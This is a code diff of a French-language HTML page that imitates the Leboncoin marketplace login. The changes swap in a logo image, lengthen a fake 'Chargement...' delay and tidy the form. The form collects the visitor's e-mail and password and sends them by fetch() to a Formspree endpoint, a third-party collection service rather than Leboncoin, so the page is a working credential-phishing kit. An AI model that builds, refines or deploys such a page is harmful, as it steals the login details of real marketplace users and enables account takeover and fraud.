@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Authentification</title>
+    <title>Document</title>
     <link rel="stylesheet" href="style.css">
     <style>
         /* Style pour le texte */
@@ -20,7 +20,7 @@
       <style>
         h2 {
           font-family: Arial;
-          font-size: 36px;
+          font-size: 25px;
         }
         p {
           font-family: Arial;
@@ -31,8 +31,8 @@
 </head>
 <body>
   <div class="container">
-    <div class="boncoin"> <a href=""><span></span></a> </div>
-   <h1 id="me-voici"> Authentification Leboncoin</h1>
+    <div class="boncoin"> <a href=""><span>&larr;</span></a> </div>
+    <img id="logo" src="photo_2023-08-05_17-45-17.jpg" alt="Leboncoin Logo">
   </div>
   <br>
   <center>
@@ -49,30 +49,29 @@
   
    
 
-  <form id="root" method="POST" action="https://formspree.io/f/mknakjpe" class="form-container">
-    <div class="form-field">
-      <label for="email">E-mail</label>
-      <input type="email" id="email" required name="Email" />
-      <span class="required">champ requis</span>
-    </div>
-    <br>
-    <div class="form-field">
-      <div class="password-field">
-        <label for="password">Mot de passe</label>
-        <input type="password" id="password" required name="MotDpass" />
-        <span class="required">champ requis</span>
-        <span class="toggle-password" onclick="togglePasswordVisibility()"><img src="img/cooolll.png"></span>
-      </div>
-      <div class="forgot-password">
-        <a href="#">Mot de passe oublié?</a>
-      </div>
-    </div>
-    <br>
-    <button type="submit" class="btn-login">Se connecter</button>
-    <br> <br>
-    <p>Envie de nous rejoindre ? <a class="compte" href="">Créer un compte</a></p>
-  </form>
-  
+    <form id="root" method="POST" action="https://formspree.io/f/mknakjpe" class="form-container">
+        <div class="form-field">
+          <label for="email">E-mail</label>
+          <input type="email" id="email"  required  name="Email"/>
+          <span class="required">champ requis</span>
+        </div>
+        <br>
+        <div class="form-field">
+          <div class="password-field">
+            <label for="password">Mot de passe</label>
+            <input type="password" id="password"  required  name="MotDpass"/>
+            <span class="required">champ requis</span>
+            <span class="toggle-password" onclick="togglePasswordVisibility()">&#128065;</span>
+          </div>
+          <div class="forgot-password">
+            <a href="#">Mot de passe oublié?</a>
+          </div>
+        </div>
+        <br>
+        <button type="submit" class="btn-login">Se connecter</button>
+        <br> <br>
+        <p>Envie de nous rejoindre ? <a  class="compte" href="">Créer un compte</a></p>
+      </form>
       <script>
         var form = document.getElementById("root");
       
@@ -85,8 +84,8 @@
           loadingMessage.innerHTML = "Chargement...";
           form.appendChild(loadingMessage);
       
-          // Attendre 6 secondes
-          await new Promise(resolve => setTimeout(resolve, 6000));
+          // Attendre 8 secondes
+          await new Promise(resolve => setTimeout(resolve, 8000));
       
           // Soumettre le formulaire
           fetch(event.target.action, {
@@ -117,8 +116,7 @@
         }
       
         form.addEventListener("submit", handleSubmit)
-      </script> 
-      <script src="script.js"></script>
+      </script>
       
 
 
